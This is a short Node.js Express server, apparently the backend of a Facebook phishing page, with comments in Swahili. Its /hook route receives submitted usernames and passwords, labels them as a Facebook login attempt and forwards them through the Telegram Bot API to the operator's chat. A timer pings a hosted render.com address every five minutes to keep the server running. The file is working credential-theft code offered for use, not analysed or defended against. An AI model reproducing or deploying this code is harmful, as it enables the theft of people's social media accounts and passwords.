const express = require("express");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

if (!botToken || !chatId) {
  console.error("BOT_TOKEN or CHAT_ID is missing!");
  process.exit(1);
}

app.use(express.json());

// Route ya kutuma credentials kwa Telegram
app.post("/hook", async (req, res) => {
  const { username, password } = req.body;

  const message = `
🔐 Facebook Login Attempt

👤 Username: ${username}
🔑 Password: ${password}
⏰ Time: ${new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" })}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    res.status(200).json({ status: "success" });
  } catch (err) {
    console.error("Telegram Error:", err.message);
    res.status(500).json({ status: "error", message: "Telegram send failed" });
  }
});

// Route ya kuiamsha server
app.get("/ping", (req, res) => {
  res.send("Server active - TRC Bot");
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);

  // Self-ping kila baada ya dakika 5
  setInterval(() => {
    axios.get(`https://fb-page-vmgg.onrender.com/ping`)
      .then(() => console.log("Self-ping successful"))
      .catch(err => console.error("Self-ping failed:", err.message));
  }, 5 * 60 * 1000); // 5 minutes
});